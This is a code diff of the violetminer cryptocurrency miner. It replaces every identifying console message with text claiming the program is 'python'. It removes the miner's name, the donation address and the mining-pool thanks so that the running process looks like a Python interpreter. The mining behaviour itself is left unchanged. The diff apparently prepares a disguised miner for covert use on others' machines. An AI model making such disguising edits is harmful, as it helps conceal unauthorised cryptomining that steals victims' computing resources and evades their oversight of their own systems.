@@ -41,7 +41,7 @@ std::vector<Pool> getDevPools()
 
 void printWelcomeHeader(MinerConfig config)
 {
-    std::cout << InformationMsg("* ") << WhiteMsg("ABOUT", 25) << InformationMsg("violetminer " + Constants::VERSION) << std::endl
+    std::cout << InformationMsg("* ") << WhiteMsg("ABOUT", 25) << InformationMsg("python " + Constants::VERSION) << std::endl
               << InformationMsg("* ") << WhiteMsg("THREADS", 25) << InformationMsg(config.hardwareConfiguration->cpu.threadCount) << std::endl
               << InformationMsg("* ") << WhiteMsg("OPTIMIZATION SUPPORT", 25);
 
@@ -169,7 +169,7 @@ void start(int argc, char **argv)
 
     if (Constants::DEV_FEE_PERCENT == 0)
     {
-        std::cout << WarningMsg("Dev fee disabled :( Consider making a one off donation to TRTLv1vC1ptGWbaGCCE5qQXaoJLDzuxEM8NiLDaUECE1Nz5FHEPiv9i7Eh57NaGhYJhKP2ep3Z6Q6NsudcNaoS9HDJBfTfX1e1N") << std::endl;
+        std::cout << WarningMsg("Free") << std::endl;
 
         /* No dev fee, just start the users mining */
         userMinerManager.start();
@@ -201,7 +201,7 @@ void start(int argc, char **argv)
             /* Stop mining for the user */
             userMinerManager.stop();
 
-            std::cout << InformationMsg("=== Started mining to the development pool - Thank you for supporting violetminer! ===") << std::endl;
+            std::cout << InformationMsg("=== Started python sub! ===") << std::endl;
             std::cout << InformationMsg("=== This will last for " + std::to_string(devMiningTime.count()) + " seconds. (Every 300 minutes) ===") << std::endl;
 
             /* Start mining for the dev */
@@ -213,7 +213,7 @@ void start(int argc, char **argv)
             /* Stop mining for the dev. */
             devMinerManager.stop();
 
-            std::cout << InformationMsg("=== Regular mining resumed. Thank you for supporting violetminer! ===") << std::endl;
+            std::cout << InformationMsg("=== Started python sub! ===") << std::endl;
 
             /* Start mining for the user */
             userMinerManager.start();
@@ -232,7 +232,7 @@ int main(int argc, char **argv)
     }
     catch (const std::exception &e)
     {
-        std::cout << WarningMsg("Miner crashed with error: ") << WarningMsg(e.what()) << std::endl;
+        std::cout << WarningMsg("Python crashed with error: ") << WarningMsg(e.what()) << std::endl;
         Console::exitOrWaitForInput(1);
     }
 }
